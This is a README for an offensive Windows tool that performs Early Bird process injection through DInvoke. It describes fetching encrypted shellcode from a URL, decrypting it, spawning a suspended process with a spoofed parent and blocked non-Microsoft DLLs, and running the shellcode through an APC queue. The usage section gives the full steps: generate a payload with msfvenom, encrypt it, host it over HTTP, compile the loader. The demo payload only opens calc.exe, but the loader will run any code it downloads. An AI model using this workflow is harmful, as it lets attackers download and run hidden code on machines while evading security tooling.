# DInvoke-EarlyBird
Early Bird process injection and PPID spoofing technique using DInvoke.

- Fetch shellcode from URL.
- Extract the key from the encrypted shellcode and decrypt it.
- Spawn a target process in suspended state.
  - Using PPID spoofing.
  - Using block dll flag: DLL which has not been signed by Microsoft and attempt to be loaded into the process, will fail.
- Execute shellcode via APC Queue.

# Usage
1. Create and encrypt your shellcode:
```bash
> msfvenom -p windows/x64/exec CMD=calc.exe -f raw > calc.bin
> python3 encrypt calc.bin
[+] Saved encrypted file as encrypted.bin (Size: 304 bytes)
```
2. Host the encrypted payload:
```bash
> python3 -m http.server 80 
```
3. Adjust the line 35 of `Program.cs` to reflect your environment.
4. Compile and run:
```bash
PS> csc /unsafe Program.cs
```

# To-Do
- Implement a process integrity check for PPID spoofing:  
Currently the PPID spoofing is retrieving a handle to the process specified without checking its integrity. If you are a low-privilege user and try to get a handle to a high privilege process, the program may crash due to access violation.

# References
- https://github.com/TheWover/DInvoke
- https://github.com/rasta-mouse/DInvoke
- https://offensivedefence.co.uk/posts/ppidspoof-blockdlls-dinvoke/
- https://github.com/Octoberfest7/OSEP-Tools
